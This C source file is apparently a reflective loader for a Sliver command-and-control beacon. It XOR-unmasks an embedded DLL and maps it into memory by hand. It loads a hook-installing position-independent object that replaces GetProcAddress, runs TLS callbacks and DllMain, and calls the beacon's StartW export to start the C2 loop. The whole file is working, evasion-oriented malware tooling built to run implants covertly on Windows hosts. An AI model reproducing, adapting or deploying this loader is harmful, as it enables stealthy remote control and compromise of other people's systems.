#include <windows.h>
#include "loader.h"
#include "tcg.h"
#include "memory.h"

DECLSPEC_IMPORT LPVOID   WINAPI KERNEL32$VirtualAlloc       ( LPVOID, SIZE_T, DWORD, DWORD );
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$VirtualProtect     ( LPVOID, SIZE_T, DWORD, PDWORD );
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$VirtualFree        ( LPVOID, SIZE_T, DWORD );
DECLSPEC_IMPORT BOOLEAN  WINAPI NTDLL$RtlAddFunctionTable   ( RUNTIME_FUNCTION *, DWORD, DWORD64 );

char _PICO_ [ 0 ] __attribute__ ( ( section ( "pico" ) ) );
char _MASK_ [ 0 ] __attribute__ ( ( section ( "mask" ) ) );
char _DLL_  [ 0 ] __attribute__ ( ( section ( "dll" ) ) );
char _DLLARGS_ [ 0 ] __attribute__ ( ( section ( "dll_args" ) ) );

int __tag_setup_hooks  ( );
int __tag_setup_memory ( );

typedef void ( * SETUP_HOOKS ) ( IMPORTFUNCS * funcs );
typedef void ( * SETUP_MEMORY ) ( MEMORY_LAYOUT * layout );

void fix_section_permissions ( DLLDATA * dll, char * src, char * dst, DLL_MEMORY * dll_memory )
{
    DWORD                  section_count = dll->NtHeaders->FileHeader.NumberOfSections;
    IMAGE_SECTION_HEADER * section_hdr   = NULL;
    void                 * section_dst   = NULL;
    DWORD                  section_size  = 0;
    DWORD                  new_protect   = 0;
    DWORD                  old_protect   = 0;

    section_hdr  = ( IMAGE_SECTION_HEADER * ) PTR_OFFSET ( dll->OptionalHeader, dll->NtHeaders->FileHeader.SizeOfOptionalHeader );

    for ( int i = 0; i < section_count; i++ )
    {
        section_dst  = dst + section_hdr->VirtualAddress;
        section_size = section_hdr->SizeOfRawData;

        if ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) {
            new_protect = PAGE_WRITECOPY;
        }
        if ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) {
            new_protect = PAGE_READONLY;
        }
        if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) ) {
            new_protect = PAGE_READWRITE;
        }
        if ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) {
            new_protect = PAGE_EXECUTE;
        }
        if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) ) {
            new_protect = PAGE_EXECUTE_WRITECOPY;
        }
        if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) ) {
            new_protect = PAGE_EXECUTE_READ;
        }
        if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) ) {
            new_protect = PAGE_EXECUTE_READWRITE;
        }

        /* set new permission */
        KERNEL32$VirtualProtect ( section_dst, section_size, new_protect, &old_protect );

        /* track memory */
        dll_memory->Sections[ i ].BaseAddress     = section_dst;
        dll_memory->Sections[ i ].Size            = section_size;
        dll_memory->Sections[ i ].CurrentProtect  = new_protect;
        dll_memory->Sections[ i ].PreviousProtect = new_protect;

        /* advance to section */
        section_hdr++;
    }

    dll_memory->Count = section_count;
}

void go ( void * loader_arguments )
{
    /* populate funcs */
    IMPORTFUNCS funcs;
    funcs.LoadLibraryA   = LoadLibraryA;
    funcs.GetProcAddress = GetProcAddress;

    /* load the pico */
    char * pico_src = GETRESOURCE ( _PICO_ );

    /* allocate memory for it */
    char * pico_data = KERNEL32$VirtualAlloc ( NULL, PicoDataSize ( pico_src ), MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );
    char * pico_code = KERNEL32$VirtualAlloc ( NULL, PicoCodeSize ( pico_src ), MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );

    /* load it into memory */
    PicoLoad ( &funcs, pico_src, pico_code, pico_data );

    /* make code section RX */
    DWORD old_protect;
    KERNEL32$VirtualProtect ( pico_code, PicoCodeSize ( pico_src ), PAGE_EXECUTE_READ, &old_protect );
    
    /* begin tracking memory allocations */
    MEMORY_LAYOUT memory    = { 0 };

    memory.Pico.Data = pico_data;
    memory.Pico.Code = pico_code;

    /* call setup_hooks to overwrite funcs.GetProcAddress */
    ( ( SETUP_HOOKS ) PicoGetExport ( pico_src, pico_code, __tag_setup_hooks ( ) ) ) ( &funcs );

    /* now load the dll (it's masked) */
    RESOURCE * masked_dll = ( RESOURCE * ) GETRESOURCE ( _DLL_ );
    RESOURCE * mask_key   = ( RESOURCE * ) GETRESOURCE ( _MASK_ );

    /* load dll into memory and unmask it */
    char * dll_src = KERNEL32$VirtualAlloc ( NULL, masked_dll->len, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );

    for ( int i = 0; i < masked_dll->len; i++ ) {
        dll_src [ i ] = masked_dll->value [ i ] ^ mask_key->value [ i % mask_key->len ];
    }

    DLLDATA dll_data;
    ParseDLL ( dll_src, &dll_data );

    char * dll_dst = KERNEL32$VirtualAlloc ( NULL, SizeOfDLL ( &dll_data ), MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );

    LoadDLL ( &dll_data, dll_src, dll_dst );

    /* track dll's memory */
    memory.Dll.BaseAddress = ( PVOID ) ( dll_dst );
    memory.Dll.Size        = SizeOfDLL ( &dll_data );

    ProcessImports ( &funcs, &dll_data, dll_dst );
    fix_section_permissions ( &dll_data, dll_src, dll_dst, &memory.Dll );

    /* call setup_memory to give PICO the memory info */
    ( ( SETUP_MEMORY ) PicoGetExport ( pico_src, pico_code, __tag_setup_memory ( ) ) ) ( &memory );

    /* now run the DLL */
    DLLMAIN_FUNC entry_point = EntryPoint ( &dll_data, dll_dst );

    /* Pointer to DLL arguments */
    char * baked_args    = GETRESOURCE ( _DLLARGS_ );
    char * dll_arguments = loader_arguments ? (char *)loader_arguments : baked_args;

    /*
     * Exception table (.pdata): register before DllMain so Go's morestack
     * and async-preemption paths can call RtlLookupFunctionEntry on beacon
     * addresses.  Without this registration, Go cannot walk the inner beacon's
     * call stack during goroutine stack growth — it reads corrupt frame data,
     * passes a ~1 GB count to memmove, and the process crashes.
     *
     * GetDataDirectory reads from dll_data->OptionalHeader which points into
     * dll_src (the raw PE buffer).  The header area in dll_dst is zeroed after
     * VirtualAlloc, so always use GetDataDirectory() here.
     */
    {
        IMAGE_DATA_DIRECTORY * exc = GetDataDirectory ( &dll_data, IMAGE_DIRECTORY_ENTRY_EXCEPTION );
        if ( exc->VirtualAddress && exc->Size ) {
            RUNTIME_FUNCTION * rf    = ( RUNTIME_FUNCTION * ) ( dll_dst + exc->VirtualAddress );
            DWORD              count = exc->Size / sizeof ( RUNTIME_FUNCTION );
            NTDLL$RtlAddFunctionTable ( rf, count, ( DWORD64 ) dll_dst );
        }

        /* TLS callbacks: call DLL_PROCESS_ATTACH before DllMain */
        IMAGE_DATA_DIRECTORY * tls_dir = GetDataDirectory ( &dll_data, IMAGE_DIRECTORY_ENTRY_TLS );
        if ( tls_dir->VirtualAddress ) {
            IMAGE_TLS_DIRECTORY64 * tls     = ( IMAGE_TLS_DIRECTORY64 * ) ( dll_dst + tls_dir->VirtualAddress );
            PIMAGE_TLS_CALLBACK   * cb_list = ( PIMAGE_TLS_CALLBACK * ) ( ULONG_PTR ) tls->AddressOfCallBacks;
            if ( cb_list ) {
                for ( PIMAGE_TLS_CALLBACK * cb = cb_list; *cb; cb++ ) {
                    ( *cb ) ( ( PVOID ) dll_dst, DLL_PROCESS_ATTACH, NULL );
                }
            }
        }
    }

    /*
     * Save export RVA before VirtualFree(dll_src) — GetDataDirectory returns a
     * pointer into dll_src; after the free that pointer is dangling.  The
     * export directory data itself lives in a mapped section (dll_dst).
     */
    DWORD export_rva = GetDataDirectory ( &dll_data, IMAGE_DIRECTORY_ENTRY_EXPORT )->VirtualAddress;

    /* free the unmasked copy */
    KERNEL32$VirtualFree ( dll_src, 0, MEM_RELEASE );

    entry_point ( ( HINSTANCE ) dll_dst, DLL_PROCESS_ATTACH, dll_arguments );

    /*
     * StartW: Sliver session beacons export this as the explicit C2-loop entry
     * point.  Called after DllMain so the Go runtime is fully initialized.
     * Returns immediately after spawning the beacon goroutine; no Sleep(INFINITE)
     * here — crystal-loader runs us on a dedicated thread and waits for us to
     * return, and the goroutines keep running after this thread exits.
     */
    typedef void ( * STARTW_FUNC ) ( void );

    if ( export_rva != 0 )
    {
        IMAGE_EXPORT_DIRECTORY * exp = ( IMAGE_EXPORT_DIRECTORY * ) ( dll_dst + export_rva );
        DWORD * names     = ( DWORD * ) ( dll_dst + exp->AddressOfNames );
        WORD  * ordinals  = ( WORD  * ) ( dll_dst + exp->AddressOfNameOrdinals );
        DWORD * functions = ( DWORD * ) ( dll_dst + exp->AddressOfFunctions );

        for ( DWORD i = 0; i < exp->NumberOfNames; i++ )
        {
            char * name = ( char * ) ( dll_dst + names [ i ] );

            if ( name[0]=='S' && name[1]=='t' && name[2]=='a' && name[3]=='r' &&
                 name[4]=='t' && name[5]=='W' && name[6]=='\0' )
            {
                ( ( STARTW_FUNC ) ( dll_dst + functions [ ordinals [ i ] ] ) ) ( );
                break;
            }
        }
    }
}